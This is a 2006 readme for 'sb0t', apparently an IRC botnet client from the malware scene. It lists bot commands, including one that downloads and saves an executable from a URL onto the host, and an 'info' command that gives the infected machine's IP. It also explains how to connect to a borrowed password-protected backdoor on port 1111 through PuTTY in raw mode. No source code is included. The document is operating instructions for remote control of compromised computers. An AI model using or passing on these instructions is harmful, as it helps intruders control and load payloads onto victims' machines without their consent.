********************  ___
sb0t - > small b0t *  >+< ver - 0.1
********************  

author      :Nibble
mail        :dark_bera@hotmail.com
time/date   :17:56 16.7.2006

---------+
Features:|-----------------------------------------+
---------+                                         |
 +++++++++++++++++++++++++++++++++++++++++++++++++ |
 |Bot connect to irc server and join to chan.    | |
 |Before u send any command u must be logged.    | |
 +++++++++++++++++++++++++++++++++++++++++++++++++ |
                                                   |
---------------------------------------------------+
---------+
Commands:|---------------------------------------------------------------+
---------+ 								 |
 ->.        - prefix 							 |
 ->login    -           						 |
 ->logout   -								 |
 ->info     - When u want to connect to backdoor                         |
	      just type info and u will get ip adress.			 |
 ->download - download http://mysite/test.exe C:\test.exe show(t/f)      |
 									 |
 If u want to connect backdoor u must download Putty.		    	 |
 I only test backdoor with Putty client. 			 	 |
 It isnt work with shity windows telnet.				 |
 Open Putty and type ip adress and port(1111) and choose      		 |
 raw protocol.								 |
 Click open and type password.						 |
									 |
 *******************************************************		 |
 *REMEMBER: when u finish your "job" u must type exit. *		 |
 ******************************************************* 		 |
									 |
 ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++		 |
 |Backdoor isnt coded by me.I take it from White Scorpion.| 		 |
 ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++ 		 |
-------------------------------------------------------------------------+
-------+
Greetz:|
-------+
  �izee - where are you my friend?
  �DiA  - great man
  �dr3f 
  �blueowl
  �genetix
  �cr4zy_j0mu - sta mai majstore
  �White Scorpion (http://www.white-scorpion.nl)
  �DoxtorL - thx for your example of compact irc bot in 29a#8
